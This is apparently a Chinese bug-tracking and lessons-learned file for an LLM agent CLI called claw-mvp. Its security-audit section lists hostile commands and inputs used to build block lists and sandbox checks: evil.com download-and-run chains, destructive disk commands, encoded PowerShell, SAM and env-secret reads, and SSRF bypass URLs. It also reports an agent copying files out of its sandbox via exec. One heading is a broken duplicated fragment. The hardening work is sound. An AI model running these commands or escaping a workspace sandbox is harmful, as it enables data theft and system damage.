# claw-mvp Bug 追踪

## 已修复的 Bug

### BUG-005 (P0) — tool 消息前置 tool_calls 缺失导致 API 400
- **发现日期**：2026-05-25
- **位置**：`src/agent.ts` 的 `buildMessages()`
- **问题**：`messages.slice(-maxHistoryTurns)` 按消息数量截断时，可能切在 assistant(tool_calls) 和 tool 结果之间，导致发送给 LLM 的 tool 消息没有前置 tool_calls 消息，API 返回 `Messages with role 'tool' must be a response to a preceding message with 'tool_calls'`
- **修复**：截断后检查第一条消息角色，若是 tool 则回溯到最近的 assistant(tool_calls) 消息作为起始位置
- **触发场景**：长对话中工具调用超过配置的 `maxHistoryTurns` 消息数时，多轮 tool call 导致消息总数超出截断线

### BUG-001 (P0) — write 跨盘符路径绕过工作区校验
- **发现日期**：2026-05-25
- **位置**：`src/tools/write.ts` 的 `ensureInWorkspace()`
- **问题**：Windows 不同盘符下（如 workspace 在 D:，目标路径在 C:），`path.relative()` 返回绝对路径，不以 `..` 开头，校验被绕过
- **修复**：增加盘符检测逻辑，不同盘符直接拒绝

### BUG-002 (P0) — exec 危险命令 `chmod -R` 大小写不匹配
- **发现日期**：2026-05-25
- **位置**：`src/tools/exec.ts` 的 `DANGEROUS_COMMANDS`
- **问题**：`isDangerous()` 对命令做 `toLowerCase()` 后，正则 `/^chmod\s+-R\s+777\s+\//` 无法匹配小写 `-r`
- **修复**：正则由 `-R` 改为 `-rR`

### BUG-003 (P1) — exec 危险命令 `mkfs.ext4` 未拦截
- **发现日期**：2026-05-25
- **位置**：`src/tools/exec.ts` 的 `DANGEROUS_COMMANDS`
- **问题**：正则 `/^mkfs\.[a-z]+\s+/` 不匹配含数字的文件系统名（ext3, ext4, ntfs, vfat 等）
- **修复**：正则改为 `/^mkfs\.[a-z0-9]+\s+/`

### BUG-004 (P1) — setup.ts 导入不存在的函数名
- **发现日期**：2026-05-25
- **位置**：`src/setup.ts`
- **问题**：import `saveConfig` 和 `getConfigDir`，但 config.ts 实际导出的是 `getClawDir`，且无 `saveConfig`
- **修复**：改为 `getClawDir`，文件写入逻辑改为 setup.ts 自己通过 `writeFileSync` 实现

### BUG-006 (P0) — consumeStream 首 chunk 后立即返回导致文本为空
- **发现日期**：2026-05-26
- **位置**：`src/agent.ts` 的 `consumeStream()` 方法
- **问题**：switch 语句后的 `return { type: "text", ... }` 位于 for-await 循环内部（而非外部），导致第一个非 done chunk（如 reasoning_delta）处理完毕后立即退出循环，textContent 始终为空字符串
- **症状**：LLM 正常返回内容，但 Agent 的 consumeStream 始终返回 content=""，表现为空响应
- **修复**：移除 switch 语句后的 return 语句，让 for-await 循环正常迭代直到 done chunk 出现。done chunk 内部有独立的 return
- **关键细节**：`case "done"` 内部有 `return` 退出整个方法，switch 语句外的 return 是多余的且有害的

### BUG-007 (P0) — DeepSeek V4 Flash reasoning_content 未传回导致 API 400
- **发现日期**：2026-05-26
- **位置**：`src/agent.ts` 的 `consumeStream()` 三处 return 语句
- **问题**：DeepSeek V4 系列模型在推理模式下，每次响应流中会包含 `reasoning_content`（thinking token），API 要求下一次请求时必须将之前 assistant 消息的 `reasoning_content` 原样传回，否则返回 `400 The reasoning_content in the thinking mode must be passed back to the API`
- **修复**：
  1. `src/llm.ts`：在 `chat()` 方法的流处理中捕获 `delta.reasoning_content`，作为 `reasoning_delta` chunk 类型产出
  2. `src/llm.ts`：在消息映射时，对 `role === "assistant"` 且有 `reasoning_content` 的消息，附加 `reasoning_content` 字段
  3. `src/agent.ts`：在 `consumeStream()` 的 switch 中添加 `case "reasoning_delta"` 累加变量
  4. `src/agent.ts`：在 `consumeStream()` 的 tool_calls 和 text 返回路径中都携带 `reasoning_content`
  5. `src/agent.ts`：在 `run()` 中存储 assistant 消息时携带 `reasoning_content`
- **关键细节**：`choice.delta.reasoning_content` 可能在 SDK 类型中被隐藏，需通过 `(delta as Record<string, unknown>).reasoning_content` 或 `(choice as any).reasoning_content` 双重 fallback 访问

### BUG-008 (P1) — 搜索拦截时 tool 错误消息写入顺序导致 API 400
- **发现日期**：2026-05-26
- **位置**：`src/agent.ts` 的搜索限制逻辑
- **问题**：当搜索轮次超限时，先向 `this.messages` push tool 错误消息，后 push assistant(tool_calls) 消息（或在某些分支中根本不 push assistant 消息），导致 API 收到 tool 消息前无对应的 assistant(tool_calls)
- **修复**：先 push assistant(tool_calls) 包含原始完整 tool 列表，再 push 搜索工具的 error result
- **关键细节**：此 Bug 与 BUG-005 同类，但发生在搜索限制代码路径中

### BUG-009 (P2) — MAX_ITERATIONS 常量删除后残留引用
- **发现日期**：2026-05-26
- **位置**：`src/agent.ts` 的 `run()` 方法末尾
- **问题**：`if (iteration >= MAX_ITERATIONS)` 中的 `MAX_ITERATIONS` 常量已被删除（改为从 config 读取），但此处的引用未同步更新
- **修复**：改为 `if (iteration >= maxIter)`

### BUG-MVP-001 (P0) — llm.ts chat() 缺少 tools 参数导致工具调用完全失效 🔥
- **发现日期**：2026-05-27
- **位置**：`src/llm.ts` 的 `chat()` 方法和 `src/agent.ts` 的 `run()` 方法
- **问题**：`chat()` 方法签名只接受 `messages` 和 `signal`，不接受 `tools` 参数。`agent.ts` 调用 `chat()` 时也没有传入工具定义。导致 LLM API 请求中不包含 `tools` 字段，LLM 不会返回 `tool_calls`，而是把工具调用意图输出为普通文本（如 `` ```tool\nread(...)\n``` ``）
- **症状**：Agent 输出类似 ````tool
read("xxx")
```` 的文本代码块，但从不实际执行工具。Agent 循环完全失效
- **危害级别**：💀 致命 — 整个 Agent 系统的核心功能（工具调用）完全不可用
- **修复**：
  1. `llm.ts`：`chat()` 增加 `tools?: OpenAI.Chat.Completions.ChatCompletionTool[]` 参数
  2. `llm.ts`：在 `chat.completions.create()` 请求中传入 `tools` 字段
  3. `agent.ts`：`run()` 中调用 `chat()` 时传入 `this.tools.getDefinitions()`
- **为什么设计文档和代码审查遗漏了**：设计文档的架构图提到了 Tools 参数流，但代码实现时 `chat()` 的签名被简化了。**检查清单已更新，必须逐项验证**

### BUG-MVP-002 (P0) — llm.ts toOpenAIMessages() 缺少 reasoning_content 传回 🔥
- **发现日期**：2026-05-27
- **位置**：`src/llm.ts` 的 `toOpenAIMessages()` 方法
- **问题**：`toOpenAIMessages()` 将 `Message[]` 映射为 OpenAI 格式时，没有将 assistant 消息的 `reasoning_content` 字段附加到 OpenAI 消息对象上。DeepSeek V4 要求每次请求都必须将之前 assistant 消息的 reasoning_content 原样传回
- **症状**：使用 DeepSeek V4 Flash 时，第二轮工具调用后返回 `400 The reasoning_content in the thinking mode must be passed back to the API`
- **危害级别**：💀 致命 — 多轮对话（>1 轮工具调用）时崩溃
- **修复**：在 `toOpenAIMessages()` 中添加：`if (m.role === "assistant" && m.reasoning_content) { (base as Record<string, unknown>).reasoning_content = m.reasoning_content; }`
- **与 BUG-007 的关系**：BUG-007 修复了 consumeStream/agent 层的 reasoning_content 传递，但遗漏了 `toOpenAIMessages()` 这一环。这是链条的最后一公里

### BUG-MVP-003 (P0) — agent.ts run() 调用 chat() 时不传入 tools
- **发现日期**：2026-05-27
- **位置**：`src/agent.ts` 的 `run()` 方法
- **问题**：`agent.ts` 中两次调用 `this.llmClient.chat()` 时只传了 `messages` 和 `signal`，未传 `tools`。即使 `llm.ts` 支持 tools 参数，agent 也没有用上
- **修复**：在 `run()` 中调用 `chat()` 时传入 `this.tools.getDefinitions()`
- **备注**：与 BUG-MVP-001 是同一根因的两面（llm 不接收 + agent 不传入）

### BUG-MVP-004 (P1) — read/write 工具路径解析："workspace/" 前缀重复拼接
- **发现日期**：2026-05-27
- **位置**：`src/tools/read.ts` 和 `src/tools/write.ts` 的路径解析逻辑
- **问题**：当 LLM 生成的路径包含 `workspace/` 前缀时（如 `workspace/project/README.md`），`path.resolve(config.workspace, args.path)` 会拼出 `D:\...\workspace\workspace\project\README.md`，文件无法找到
- **症状**：Agent 报 `File not found: workspace/project/README-source.md`，但绝对路径 `D:\...\workspace\project\README-source.md` 可以读取。Agent 浪费多轮迭代在路径尝试上
- **修复**：在 `path.resolve()` 之前，用正则去除路径开头的 `./workspace/` 或 `workspace/` 前缀：`cleanPath.replace(/^(\.?[\/])?workspace[\/]/, "")`
- **关键细节**：这个问题的根源是 LLM 生成的路径与软件提示中的路径写法一致（如"读取 workspace/logs/server.log"），LLM 会原样使用

### BUG-MVP-005 (P1) — exec 工具 Windows 中文环境编码乱码
- **发现日期**：2026-05-27
- **位置**：`src/tools/exec.ts` 的 stdout/stderr 解码
- **问题**：Windows 中文环境下 `cmd.exe` 默认输出编码为 GBK (CP936)，而 Node.js `Buffer.toString()` 默认按 UTF-8 解码，导致中文输出全部变成乱码（如"市场部"显示为"����"）。Python 子进程同样受此影响
- **症状**：
  - PowerShell 错误消息显示为 `'Get-ChildItem' �����ڲ����ⲿ����` 乱码
  - Python 中文输出显示为 `===== ����ͳ�� =====` 
  - Agent 识别到乱码后反复重试不同命令，浪费迭代
- **修复**：
  1. Windows 平台用 `cmd.exe /c "chcp 65001 >nul && <原命令>"` 包装，强制切换到 UTF-8 代码页
  2. 设置环境变量 `PYTHONIOENCODING=utf-8` 确保 Python 输出 UTF-8
  3. 设置 `LANG=en_US.UTF-8` 避免 locale 相关问题
- **教训**：跨平台 CLI 工具必须考虑 Windows 编码兼容性。`shell: true` + `cmd.exe` 不等于 UTF-8 输出

### BUG-MVP-006 (P2) — Agent "上下文蔓延"：发现无关文件后遗忘原始任务
- **发现日期**：2026-05-27
- **位置**：Agent 行为层面（非代码缺陷）
- **问题**：当 Agent 执行某任务时无意中发现 workspace 中存在其他文件，会转向"探索所有文件"，最终遗忘用户的原始需求。例如用户要求"基于 README-source.md 生成 README.md"，Agent 发现 workspace 中还有 CSV、日志、Python 脚本等文件后，转而执行"全面工作总结"
- **症状**：
  - 测试用例 1：Agent 分析了日志但未用 write 保存报告（输出为终端文本）
  - 测试用例 4：Agent 从"生成 README" 跑偏到"读取所有 workspace 文件→生成工作总结→执行 Python 分析脚本"，最终 README.md 未生成
- **根因分析**：
  1. System Prompt 鼓励 Agent "深入探索"（design-doc 提到"Verifying with read after edits"），但缺少"聚焦当前任务"的约束
  2. Agent 调用 `exec dir` 查看目录时必然发现其他文件，好奇心被触发
  3. 没有任务完成检查机制——Agent 不会在完成后确认"这个任务完成了，不需要再探索"
- **建议缓解措施**：
  1. System Prompt 增加 "Stick to the user's request. Do NOT explore unrelated files."
  2. 限制 exec 的 `dir`/`ls` 使用频率
  3. 增加任务完成自检：text 响应中强制包含对用户每项要求的逐一确认

### BUG-MVP-007 (P1) — exec 工具编码：chcp 65001 对 pipe stdio 无效 🔥
- **发现日期**：2026-05-27（第二轮测试）
- **位置**：`src/tools/exec.ts` 的编码处理
- **问题**：第一版修复使用 `cmd.exe /c "chcp 65001 >nul && <命令>"` 尝试解决中文乱码，但 **`chcp 65001` 只改变控制台代码页，对 pipe (stdio: "pipe") 输出完全无效**
- **根因**：`chcp` 改变的是控制台(console)的输出编码，但 Node.js `cp.spawn` 使用 `stdio: "pipe"` 时，子进程 stdout/stderr 是管道而非控制台，编码不受 chcp 影响。cmd.exe 的 pipe 输出仍使用系统默认 GBK 编码
- **症状**：
  - 错误消息仍显示为 `'ls' �����ڲ����ⲿ����` 乱码
  - Python 脚本中文输出显示为 `===== ����ͳ�� =====`
  - Agent 因识别到乱码反复重试不同命令，浪费迭代
- **正确修复**：在 Node.js 层使用 `TextDecoder('gbk')` 解码 Buffer
  ```typescript
  function decodeBuffer(buf: Buffer): string {
    if (buf.length === 0) return "";
    const utf8 = buf.toString("utf-8");
    if (!utf8.includes("\ufffd")) return utf8;  // UTF-8 OK
    try { return new TextDecoder("gbk", { fatal: false }).decode(buf); }
    catch { return utf8; }
  }
  ```
- **验证**：修复后 `systeminfo | findstr /C:"OS"` 输出中文正常显示"OS 名称: Microsoft Windows 11 专业版"
- **关键教训**：Windows 上 pipe 输出编码 ≠ 控制台输出编码。`chcp` 只在控制台生效，pipe 场景必须在接收端解码

### BUG-MVP-008 (P1) — 多工具调用时消息截断导致 LLM Error 400
- **发现日期**：2026-05-27（第二轮测试）
- **位置**：`src/agent.ts` 的 `truncateHistoryByGroups()` 方法
- **问题**：当 Agent 在一次 LLM 响应中调用多个独立工具（如 read + exec + exec），消息数量快速增长。`truncateHistoryByGroups()` 截断时可能切断工具调用组，导致 API 返回 `400 An assistant message with 'tool_calls' must be followed by tool messages`
- **症状**：
  - 长任务中反复出现 `[LLM Error] 400 An assistant message with 'tool_calls' must be followed by tool messages`
  - 多出现在同时执行 ≥3 个工具调用后
  - 消息截断时如果 assistant(tool_calls) 及其对应的 tool 消息不在同一原子组中，会被错误拆分
- **触发条件**：
  1. Agent 在一次响应中做 ≥3 个工具调用
  2. 累计消息数超过 `maxHistoryTurns`（默认 20）
  3. 截断算法未能正确将跨组 tool 消息与 assistant 消息配对
- **修复方向**（待实施）：
  1. 提升 `maxHistoryTurns` 默认值（20 → 50）作为临时缓解
  2. 改进原子组识别：确保 assistant(tool_calls) + 所有对应的 tool 消息作为一个不可分割的组
  3. 或者采用回退策略：如果截断后第一条是 tool 消息，向前回溯到最近的 assistant(tool_calls)

### BUG-MVP-009 (P1) — session save 崩溃：索引结构不兼容
- **发现日期**：2026-05-27（会话命令测试）
- **位置**：`src/session.ts` 的 `loadIndex()` 方法
- **问题**：`loadIndex()` 假定索引文件格式为 `{ nameToId: {}, ids: [] }`，但旧版本保存的索引是扁平 `{ name: id }` 格式。`JSON.parse` 成功但 `index.nameToId` 为 `undefined`，导致 `Cannot set properties of undefined`
- **症状**：`/save test-session` → `[ERROR] Failed to save session: Cannot set properties of undefined (setting 'test-session')`
- **修复**：`loadIndex()` 增加结构兼容检测：如果 `parsed.nameToId` 为对象，使用新格式；否则将扁平 `name→id` 映射转为标准结构
- **教训**：文件格式演进时必须考虑向后兼容。`as` 类型断言不验证实际结构，运行时仍然可能拿到不符合预期的数据

---

### BUG-MVP-010 (P1) — Windows 11 sudo 未被列入危险命令黑名单
- **发现日期**：2026-05-27（迭代测试）
- **位置**：`src/tools/exec.ts` 的 `getBlacklist()`
- **问题**：`sudo` 命令仅在 Linux/macOS 黑名单中，但 Windows 11 已原生支持 `sudo`。在 Windows 上执行 `sudo rm -rf /` 未被拦截
- **症状**：Windows 11 上 `sudo` 命令不被拦截，直接传递给系统（虽然 rm 在 Windows 上不可用，实际危害有限）
- **修复**：在 Windows 黑名单中添加 `/^sudo\s+/` 正则
- **教训**：危险命令黑名单需要跟踪操作系统版本更新。Windows 11 引入的新命令（如 sudo）应同步加入黑名单

### BUG-MVP-011 (P1) — Python auto-pip bootstrap 包名到模块名映射错误 🔥
- **发现日期**：2026-05-27（迭代测试 claw-mvp）
- **位置**：`src/tools/python.ts` 的 auto-pip bootstrap 代码
- **问题**：bootstrap 代码使用 `_pkg.replace("-", "_")` 将 pip 包名转为模块名，但 `python-docx` 的 pip 包名与实际 Python 模块名 `docx` 不同，`python-pptx` 类似问题（pip 包名 `python-pptx`，模块名 `pptx`）
- **症状**：
  - 任何 Python 脚本执行都失败：`ModuleNotFoundError: No module named 'python_docx'`
  - 即使 pip install 成功，importlib.import_module("python_docx") 仍然失败
  - 影响面极大：**所有** Python 调用都先执行 bootstrap，导致所有 Python 工具调用全部崩溃
- **根因**：pip 包名与实际 Python import 模块名并不总是一一对应。常见例外：`python-docx` → `docx`，`python-pptx` → `pptx`
- **修复**：在 bootstrap 脚本中添加 `_pkg_to_mod` 映射表：
  ```python
  _pkg_to_mod = {"python-docx": "docx", "python-pptx": "pptx", "PyPDF2": "PyPDF2"}
  _mod_name = _pkg_to_mod.get(_pkg, _pkg.replace("-", "_"))
  ```
- **教训**：
  1. **pip 包名 ≠ Python 模块名**。不能简单用 `replace("-", "_")` 转换
  2. 加入新 pip 依赖时必须验证：安装后 `importlib.import_module()` 能成功导入
  3. 建议维护一个完整的 `PACKAGE_TO_MODULE` 映射表，而不是依赖启发式转换

## 新增教训（2026-05-27 迭代测试总结）

### 教训 13：迭代测试必须清理工作区残留
- **问题**：连续迭代测试时，前一次测试的文件残留会影响后续测试结果
- **表现**：write 测试期望 "created" 但文件已存在返回 "overwritten"
- **解决方案**：测试前显式清理工作区中已知的测试文件
- **最佳实践**：测试框架应在 setUp 中调用 `rmSync(workspace, { recursive: true })` 或逐一删除已知测试文件

### 教训 14：网络依赖功能应设计 graceful degradation
- **问题**：web_search 依赖 DuckDuckGo Lite，服务不可用时全部搜索失败
- **现状**：代码已实现双引擎 fallback（DuckDuckGo → Bing），但两者可能同时不可用
- **改进方向**：考虑添加更多搜索后端，或在服务不可用时返回有用的降级信息而非纯失败

## 新增教训（2026-05-27 第二轮实测总结）

### 教训 10：chcp 65001 对 pipe 输出无效
- **核心认知**：Windows 上 `chcp 65001` 改变的是控制台(Console)的代码页，不影响管道(Pipe)输出
- **正确做法**：在 Node.js 接收端用 `TextDecoder('gbk')` 解码 Buffer，或尝试 UTF-8 失败后回退 GBK
- **验证方法**：用 `echo 中文测试` 验证，修复后应显示正常汉字而非乱码

### 教训 11：消息截断的原子性必须严格保证
- **问题根源**：`maxHistoryTurns` 默认 20 对多工具调用场景不够用（每个工具调用至少产生 2 条消息：assistant + tool）
- **触发阈值**：5 轮对话 × 每轮 3 个工具 = 15 条消息，再加上 user/assistant 文本消息，轻松超过 20
- **缓解建议**：`maxHistoryTurns` 默认值至少设为 50，或在设计文档中标注"多工具并行场景需提高此值"

### 教训 12：index.ts 调用 session 函数时的命名混淆
- **当前代码**：`import { save as saveSession, load as loadSession } from "./session.ts"`
- **注意**：别名重命名使调试困难，建议 session.ts 直接导出 `saveSession`/`loadSession` 等命名明确的函数

### 教训 15：pip 包名与 Python import 模块名不是一回事 🔥
- **问题**：`pip install python-docx` 安装成功后，Python 中用 `import docx` 而非 `import python_docx`
- **受影响包**：
  | pip 包名 | Python import 名 |
  |----------|-----------------|
  | `python-docx` | `docx` |
  | `python-pptx` | `pptx` |
  | `PyPDF2` | `PyPDF2` |
  | `openpyxl` | `openpyxl` |
  | `pdfplumber` | `pdfplumber` |
- **根因**：pypi 包名是一个"品牌名"，安装后在 `site-packages` 中的目录名才是真正的模块名
- **最佳实践**：
  1. 维护 `PACKAGE_TO_MODULE` 映射表，不要依赖 `replace("-", "_")` 启发式转换
  2. 新增 auto-pip 依赖前，先在本地验证 `pip install <包名>` 后 `python -c "import <模块名>"` 能成功
  3. 在 auto-pip bootstrap 脚本中，先查映射表，找不到再用 `replace("-", "_")` 作为回退

---

## 安全迭代教训（2026-05-27 安全审计 v1.0）

### 安全教训 1：read 工具必须实现 workspace 边界检查
- **漏洞编号**: SEC-001 (CRITICAL)
- **问题**: read 工具完全没有 workspace 边界检查，直接 `resolve(workspace, cleanPath)` 将绝对路径也解析到文件系统，LLM 可通过 `read C:\Windows\System32\config\SAM` 读取任意系统文件
- **修复**: 添加 `ensureInWorkspace()` 函数，检查:
  1. UNC 路径拦截 (`\\` 或 `//` 开头)
  2. 跨盘符检测 (Windows `C:` vs `D:`)
  3. 相对路径遍历检测 (`..` 跳转)
  4. 绝对路径检测 (`isAbsolute`)
- **代码位置**: `src/tools/read.ts`
- **注意**: 此检查必须在任何文件系统操作（`existsSync`, `statSync`, `readFileSync`）之前执行，否则 UNC 路径可能导致系统调用异常

### 安全教训 2：exec 黑名单需覆盖 PowerShell 编码命令
- **漏洞编号**: SEC-002 (CRITICAL)
- **问题**: PowerShell `-EncodedCommand`/`-Enc`/`-ec` 参数可执行 Base64 编码的任意恶意命令，绕过文本黑名单
- **修复**: 添加正则 `/-(EncodedCommand|Enc|ec)\s+/i` 和 `/-e\s+[A-Za-z0-9+/=]{20,}/i` (Base64 检测)
- **代码位置**: `src/tools/exec.ts` 的 `getBlacklist()` Windows 分支
- **注意**: `-e` 参数匹配需要结合 Base64 长度启发式（至少 20 字符），避免误拦截短参数

### 安全教训 3：exec 黑名单需覆盖 PowerShell 下载执行链
- **漏洞编号**: SEC-003 (CRITICAL)
- **问题**: `iex (iwr http://evil.com/1.ps1)` 和 `curl http://evil.com/1.sh | bash` 等下载+执行链可完全绕过单命令黑名单
- **修复**: 添加以下模式到黑名单:
  - PowerShell: `Invoke-Expression`、`iex`、`Invoke-WebRequest`、`iwr`、`Invoke-RestMethod`、`irm`
  - Unix: `curl ... | bash`、`wget ... | sh` 等管道执行模式
- **代码位置**: `src/tools/exec.ts`

### 安全教训 4：exec 需拦截环境变量泄露
- **漏洞编号**: SEC-006 (HIGH)
- **问题**: `Get-ChildItem env:`、`ls env:` 等命令可列出所有环境变量，包括 `API_KEY`、`SECRET` 等敏感信息
- **修复**: 添加 `Get-ChildItem env:`、`gci env:`、`ls env:`、`dir env:` 拦截
- **注意**: 不要拦截 `$env:PATH` 等单体环境变量访问（过于激进，影响正常使用）

### 安全教训 5：exec 需拦截 Windows 计划任务和网络配置修改
- **漏洞编号**: SEC-009/011 (MEDIUM)
- **问题**: `schtasks`（计划任务）、`netsh`（防火墙配置）、`net user`（用户管理）未被拦截
- **修复**: 添加 `schtasks`、`netsh`、`net user`、`net localgroup`、`net share`、`icacls`、`cacls`、`takeown`、`attrib` 等 Windows 管理命令
- **代码位置**: `src/tools/exec.ts`

### 安全教训 6：web_fetch 需防御 SSRF 攻击的多种变体
- **漏洞编号**: SEC-027~030 (CRITICAL/HIGH)
- **问题**: SSRF 防护仅覆盖基础 localhost/内网 IP，但以下变体可绕过:
  - IPv6 映射 IPv4: `http://[::ffff:127.0.0.1]/`
  - 十进制 IP: `http://2130706433/` (= 127.0.0.1)
  - 十六进制 IP: `http://0x7f000001/`
  - 裸数字: `http://0/` (= 0.0.0.0)
  - 云元数据: `http://169.254.169.254/`
  - `file://` 协议
- **修复**:
  1. 添加 IPv6 mapped IPv4 检测
  2. 检测纯数字 hostname
  3. 检测十六进制 hostname
  4. 添加 `169.254.0.0/16` 到内网前缀列表
  5. `file://` 协议在 URL 解析阶段拒绝
- **代码位置**: `src/tools/web_fetch.ts` 的 `fetchUrl()`

### 安全教训 7：python 工具需实现代码安全检查
- **漏洞编号**: SEC-042 (CRITICAL)
- **问题**: Python 脚本可执行任意系统命令（`os.system`, `subprocess.run` 等），完全绕过 exec 黑名单
- **修复**: 添加 `checkScriptSecurity()` 函数，拦截:
  - 系统命令: `os.system`, `subprocess.(call|run|popen)`, `os.popen/execv/execl`
  - 文件删除: `os.remove/rmdir/unlink`, `shutil.rmtree`
  - 网络访问: `socket`, `requests`, `urllib`, `http.client`
  - 动态代码: `eval`, `exec`, `compile`, `__import__`
  - 本地代码: `ctypes`
- **注意**: 此检查是静态模式匹配，不是沙箱。高级攻击者可能仍可绕过。生产环境建议使用真正的 Python 沙箱
- **代码位置**: `src/tools/python.ts`

### 安全教训 8：UNC 路径需在文件操作前拦截
- **漏洞编号**: SEC-019 (CRITICAL)
- **问题**: UNC 路径 (\\\\localhost\\C$\\...) 在 `existsSync`/`readFileSync` 调用时会导致系统异常（EBUSY 错误），暴露内部实现信息
- **修复**: 在 `ensureInWorkspace()` 中优先检测 `\\\\` 或 `//` 开头的 UNC 路径并立即拒绝
- **代码位置**: `src/tools/read.ts` 的 `ensureInWorkspace()`

### 安全教训 9：exec 必须拦截文件复制/移动命令逃逸（🔴 实战发现）
- **漏洞编号**: SEC-010 (CRITICAL)
- **发现方式**: 用户实战测试，LLM 使用 `Copy-Item -Destination D:\\agent\\` 成功将工作区文件泄露到外部目录
- **问题**: write 工具的 workspace 沙箱只保护了 write 工具自身，exec 工具中的 `Copy-Item`、`Move-Item`、`Out-File`、`Set-Content`、`>` 重定向等文件写入命令可以**完全绕过沙箱**
- **攻击链**: `read workspace/机密.pptx → exec Copy-Item → D:\\agent\\` 仅需两步即可泄露任意文件
- **修复**: 添加 `checkFileOperationSandbox()` 函数，检测所有文件写入命令并校验目标路径是否在 workspace 内
- **关键**: 正则提取需同时支持 PowerShell（`-Destination`）、cmd（位置参数）和重定向（`>`）三种语法；需展开 `$env:XXX`、`%XXX%` 和 `~` 等变量
- **代码位置**: `src/tools/exec.ts`

---

## 原有实战教训 (`\\localhost\C$\...`) 在 `existsSync`/`readFileSync` 调用时会导致系统异常（EBUSY 错误），暴露内部实现信息
- **修复**: 在 `ensureInWorkspace()` 中优先检测 `\\` 或 `//` 开头的 UNC 路径并立即拒绝
- **代码位置**: `src/tools/read.ts` 的 `ensureInWorkspace()`

---

## 新增教训（2026-05-27 实测总结）

### 教训 7：`--check` 通过 ≠ 功能正常 — 必须端到端实测
- **背景**：BUG-MVP-001/002/003 全部通过了 `--check` 类型检查，代码结构"看起来正确"，但只要运行一次真实对话就立刻暴露
- **教训**：
  1. **类型检查是必要不充分条件**。strip-types 只检查语法，不检查逻辑完整性
  2. 工具链闭环验证：至少用一个简单任务（如"读 file.txt 并写 file2.txt"）运行 Agent，确认 tool_calls 实际触发
  3. 开发清单增加"端到端冒烟测试"步骤

### 教训 8：exec 工具编码处理 — Windows 中文环境特殊处理
- **问题根源**：Windows 默认 ANSI 代码页（GBK/CP936）与 Node.js/LLM 的 UTF-8 预期冲突
- **解决方案三要素**：
  1. `chcp 65001` 切换 cmd 代码页
  2. `PYTHONIOENCODING=utf-8` 环境变量
  3. `LANG=en_US.UTF-8` 环境变量
- **注意**：不能简单使用 `shell: true`，因为它仍然使用系统默认代码页
- **测试方法**：使用含中文的 echo 命令验证：`echo 测试中文` 应正常显示

### 教训 9：Agent 上下文蔓延与任务遗忘
- **现象描述**：Agent 在探索过程中遇到新信息后会"忘记"原始任务，转而探索新发现的内容
- **4 个测试用例中有 2 个（50%）出现了此问题**
- **缓解方向**：
  1. System Prompt 强化任务聚焦约束
  2. 限制无关探索（减少 `dir`/`ls` 调用的必要性，通过更智能的路径推测）
  3. 工具结果中加入"当前任务 ID/目标"提示
- **设计建议**：考虑在 Agent Loop 中增加"目标跟踪"机制——每轮迭代前提醒 LLM 当前会话的初始目标

---

## 新增教训（2026-05-26 实战总结）

### 教训 1：`--experimental-strip-types` 的陷阱
- **`--check` 可通过但实际运行失败**：strip-types 的 check 模式和实际运行模式使用的 TypeScript 解析器不同。brace 不匹配（如 `for-await` 少一个 `}`）时，check 可能通过但实际执行报 `SyntaxError: Expression expected`
- **函数内不允许 `type Foo = ...` 声明**：strip-types 不支持函数作用域内的类型别名，会导致 `Unexpected token` 错误
- **泛型类型注解可能被误解**：如 `Promise<"timeout">` 中的 `<>` 在极少数情况下会被误解析
- **异步 IIFE + Promise.race 模式**：在 strip-types 下大概率报错，推荐用普通 `for-await` + `setInterval` 实现超时，或直接用 `try/finally` 清理

### 教训 2：流超时保护的正确实现方式
- **❌ 禁用模式**：`Promise.race` + 异步 IIFE + `timeoutPromise`。strip-types 不兼容，brace 极易错位
- **✅ 推荐模式**：
  ```typescript
  let timedOut = false;
  const timer = setInterval(() => { if (delta > threshold) timedOut = true; }, 10_000);
  try {
    for await (const chunk of generator) {
      if (timedOut) break;
      // ... process
    }
  } finally {
    clearInterval(timer);
  }
  ```

### 教训 3：System Prompt 的长度控制
- **过长的 prompt 导致 LLM 行为异常**：本项目的 system prompt 从 515 字符（精简版）到约 2000 字符（详细版），过长版本导致 `deepseek-chat` 只回复"我来"两个字符后永远空响应
- **建议上限**：600 字符以内。核心规则用一句话概括
- **每一条规则都要权衡**：反空话、平台命令、代码生成——每条都有用，但堆在一起 LLM 就懵了

### 教训 4：API Key 中的特殊字符
- **Unicode 省略号（U+2026）不是合法的 HTTP Header 值**：如果用户以"sk-xxx…yyy"形式提供 Key（含省略号），需替换为真实字符，否则 `Bearer sk-xxx…yyy is not a legal HTTP header value`
- **调试方法**：当 API 报 `APIConnectionError: Connection error` 时，先检查 API Key 是否含非法字符

### 教训 5：中文引号与 Python 字符串的冲突
- **问题**：LLM 生成 Python 脚本时，经常使用中文双引号 `""` 或中文单引号 `''` 包裹中文短语，但如果这些字符出现在普通双引号/单引号字符串中，会导致 Python SyntaxError
- **缓解措施**：
  1. System Prompt 添加规则："Avoid Chinese quotation marks in Python strings. Use brackets or triple-quotes instead."
  2. 在 write 工具中可选做自动替换（将 `""` → `【】`）
  3. LLM 应优先使用 Python 三引号 `"""..."""` 包裹含中文的字符串

### 教训 6：Agent 反空话机制的三层防线
- **第一层**：System Prompt 告警——"Text-only responses are FINAL and END the conversation"
- **第二层**：Agent Loop 检测——`looksLikeChatter()` + <300 字符文本→强制重试（最多 3 次）
- **第三层**：空响应检测——0 字符文本也触发重试
- **关键参数**：`chatterRetryCount` 防止无限循环（上限 3 次）

---

## 常见问题

### Q: `ERR_MODULE_NOT_FOUND: Cannot find module '.../config.js'`
**原因**：`--experimental-strip-types` 不会自动解析 `.js` → `.ts`。内部 import 必须使用 `.ts` 后缀。
**检查**：所有 `from "./xxx.ts"` 是否都正确使用 `.ts` 后缀。

### Q: chalk 或 openai 找不到
**原因**：npm 包未安装。
**修复**：在项目目录运行 `npm install`。需要网络访问 npm registry。

### Q: API Key 未配置
**原因**：`~/.claw/config.json` 不存在或 apiKey 为空。
**修复**：运行 `node --experimental-strip-types src/setup.ts` 或手动创建配置文件。

### Q: `SyntaxError: 'xxx' has already been declared`
**原因**：重复 import（通常发生在修复 Bug 时新增 import 语句导致）。
**修复**：检查文件顶部的 import 区，合并重复的 import。

### Q: `APIConnectionError: Connection error` 但 API Key 已配置
**原因**：API Key 中可能含 Unicode 特殊字符（如省略号 U+2026）。检查 Key 是否完整且不含非常规字符。
**修复**：向用户确认完整的 API Key，不要保留省略号占位符。

### Q: DeepSeek V4 返回 `400 The reasoning_content ... must be passed back`
**原因**：V4 Flash/Pro 在推理模式下要求传回 reasoning_content。检查 `src/agent.ts` 的 `consumeStream()` 返回值和 `src/llm.ts` 的消息映射是否正确携带该字段。
**参考**：参见 BUG-007 的修复方案。

